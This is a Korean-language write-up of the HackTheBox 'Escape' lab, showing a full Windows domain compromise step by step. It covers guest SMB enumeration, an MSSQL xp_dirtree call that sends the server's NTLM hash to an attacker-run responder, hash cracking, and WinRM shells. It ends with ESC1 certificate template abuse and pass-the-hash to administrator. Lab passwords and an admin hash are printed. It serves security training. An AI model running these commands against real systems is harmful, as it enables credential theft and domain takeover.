# Escape - HackTheBox
## Recon
```bash
sudo nmap -p 135,139,1433,3268,3269,389,445,464,49667,49689,49690,49702,53,593,5985,62236,62265,636,88,9389 -sC -sV -vv -oA escape 10.129.228.253
```
<img width="1204" height="249" alt="image" src="https://github.com/user-attachments/assets/0c93b024-402e-44e9-b72c-26e7034a11bf" />
<img width="1204" height="96" alt="image" src="https://github.com/user-attachments/assets/200094e9-86f8-4c61-a7db-cf5995220715" />
<img width="1204" height="220" alt="image" src="https://github.com/user-attachments/assets/6725caa5-0e93-43e1-8550-331a8dbb7de1" />
<img width="1204" height="245" alt="image" src="https://github.com/user-attachments/assets/6a10cfe0-dc03-4acb-806a-90fef471e7b9" />

- KERBEROS(88)
- LDAP(389)
- SMB(445)
- MSSQL(1433)
- WINRM(5985)
- CA

<br>

- `/etc/hosts`에 `dc.sequel.htb` 추가.
<img width="1204" height="71" alt="image" src="https://github.com/user-attachments/assets/43f75d8d-27ff-46ff-a46d-8737820d0985" />

---
## Shell as sql_svc
- 유저목록 수집.
```bash
nxc smb 10.129.228.253 -u guest -p '' --rid-brute|grep SidTypeUser
```
<img width="1204" height="270" alt="image" src="https://github.com/user-attachments/assets/23e14440-67a3-4b30-b9e3-bc74a4523b41" />

<br>
<br>

- SMB 탐색.
```bash
smbmap -u guest -p '' -H 10.129.228.253
```
<img width="1204" height="205" alt="image" src="https://github.com/user-attachments/assets/b5821feb-6f07-4cf4-b339-4231fece0044" />

<br>
<br>

- `/public`경로의 내부 파일 다운로드.
```bash
smbclient -U guest //10.129.228.253/public
```
<img width="1203" height="312" alt="image" src="https://github.com/user-attachments/assets/8c18fc4a-8233-4f67-89dc-3dba5ffbd753" />

<br>
<br>

- pdf파일에서 초기 비밀번호 노출.
<img width="1110" height="152" alt="image" src="https://github.com/user-attachments/assets/21c17af3-67e2-4145-b384-49dcbe6f92fe" />

<br>
<br>

- 유저목록에는 존재하지 않지만 mssql 접속이 가능.
```bash
nxc mssql 10.129.228.253 -u PublicUser -p GuestUserCantWrite1 --local-auth
```
<img width="1201" height="124" alt="image" src="https://github.com/user-attachments/assets/72792dfa-985f-4201-8823-9ef37eec02b8" />

<br>
<br>

- `mssql` 접속.
```bash
impacket-mssqlclient PublicUser:GuestUserCantWrite1@10.129.228.253
```
<img width="1201" height="269" alt="image" src="https://github.com/user-attachments/assets/583a8979-5f6c-4ac2-ae85-d00a77ff3663" />

<br>
<br>

- `xp_cmdshell`를 사용해보려고 했으나 실패.
- `responder`를 사용해서 해시 캡쳐 시도.
```
sudo responder -I tun0 -v

SQL (PublicUser  guest@master)> EXEC master..xp_dirtree '\\10.10.14.23\share\'
```
<img width="1201" height="202" alt="image" src="https://github.com/user-attachments/assets/fa55e122-c10f-4383-aa78-0df32416afa6" />

<br>
<br>

- 크래킹 시도.
```bash
john hash --wordlist=~/util/rockyou.txt
```
<img width="1201" height="226" alt="image" src="https://github.com/user-attachments/assets/80b41bbd-5e1e-4b32-9f0f-8b4c2f6c282d" />

<br>
<br>

- `winrm`로그인 시도하여 성공.
```bash
nxc winrm 10.129.228.253 -u sql_svc -p REGGIE1234ronnie
```
<img width="1201" height="212" alt="image" src="https://github.com/user-attachments/assets/d81d75bc-342c-462c-8e1b-a87a32ea5efc" />

<br>
<br>

- 셸 획득.
```bash
evil-winrm -i 10.129.228.253 -u sql_svc -p REGGIE1234ronnie
```
<img width="1201" height="290" alt="image" src="https://github.com/user-attachments/assets/3ac6b77b-2ce0-48f8-8e78-08f2dd1ce8c6" />

---
## Shell as ryan.cooper
- `c:\sqlserver\logs`에서 `errorlog.bak` 발견.
<img width="1201" height="209" alt="image" src="https://github.com/user-attachments/assets/b1d96997-e3f5-4831-a544-78f01b7154e4" />

<br>
<br>

- `errorlog.bak`의 아래에서 로그인을 시도하다가 비밀번호를 유저명으로 입력한 것처럼 확인 됨.
<img width="1205" height="114" alt="image" src="https://github.com/user-attachments/assets/050e291d-e3b7-42cc-9a3f-ab90d4cfeea4" />

<br>
<br>

- 로그인 시도하여 성공.
```bash
nxc winrm 10.129.228.253 -u Ryan.Cooper -p NuclearMosquito3
```
<img width="1205" height="209" alt="image" src="https://github.com/user-attachments/assets/8a02d83c-1b55-4c6b-a214-b637e971055c" />

<br>
<br>

- 셸 획득.
```bash
evil-winrm -i 10.129.228.253 -u ryan.cooper -p NuclearMosquito3
```
<img width="1205" height="293" alt="image" src="https://github.com/user-attachments/assets/8685b1c4-e6e0-4849-9081-89fcaa2e7c63" />

---
## Privesc
- CA가 존재하여 `certipy-ad`를 사용하여 취약점 확인.
- ESC1
```bash
certipy-ad find -u ryan.cooper -p NuclearMosquito3 -target dc.sequel.htb -text -stdout -vulnerable
```
<img width="1205" height="116" alt="image" src="https://github.com/user-attachments/assets/9426ab9d-7293-4f1e-b57d-04a980d4d816" />
<img width="1205" height="73" alt="image" src="https://github.com/user-attachments/assets/a15a768f-fde0-4bbd-93f5-6b67a25a8359" />

<br>
<br>

- https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc1-enrollee-supplied-subject-for-client-authentication
- `administrator`의 Sid 확인.
```bash
certipy-ad account -u ryan.cooper -p NuclearMosquito3 -dc-ip 10.129.228.253 -user administrator read
```
<img width="1205" height="293" alt="image" src="https://github.com/user-attachments/assets/5c95e4ef-9c7d-4a51-aaf0-1291de8dff98" />

<br>
<br>

- `administrator`의 인증서 요청.
```bash
certipy-ad req -u ryan.cooper@sequel.htb -p NuclearMosquito3 -dc-ip 10.129.228.253 -target dc.sequel.htb -ca sequel-dc-ca -template UserAuthentication -upn administrator@sequel.htb -sid 'S-1-5-21-4078382237-1492182817-2568127209-500'
```
<img width="1205" height="277" alt="image" src="https://github.com/user-attachments/assets/c0e9861c-6c36-4972-8581-6286135ffcd6" />

<br>
<br>

- `administrator` 인증서로 인증 실행하여 해시 획득.
```bash
certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.228.253
```
<img width="1205" height="320" alt="image" src="https://github.com/user-attachments/assets/7d1aaaba-9747-4572-92d1-41d9d0ab8325" />

<br>
<br>

- `administrator:a52f78e4c751e5f5e17e1e9f3e58f4ee` 로그인 성공.
```bash
nxc winrm 10.129.228.253 -u administrator -H a52f78e4c751e5f5e17e1e9f3e58f4ee
```
<img width="1205" height="273" alt="image" src="https://github.com/user-attachments/assets/01787465-9439-49be-8204-3f5789c7ffb1" />

<br>
<br>

- 셸 획득.
<img width="1205" height="292" alt="image" src="https://github.com/user-attachments/assets/ae3999c1-2326-4aeb-b47d-758d8cc8ec1c" />

---
## FLAG
- `c:\users\ryan.cooper\desktop\user.txt`
<img width="1205" height="205" alt="image" src="https://github.com/user-attachments/assets/2d444ede-289f-4a38-bc70-5ea7f9ea2e84" />

<br>
<br>

- `c:\users\administrator\desktop\root.txt`
<img width="1205" height="205" alt="image" src="https://github.com/user-attachments/assets/a495f31d-1707-40fb-9cf1-42d70f0275a2" />

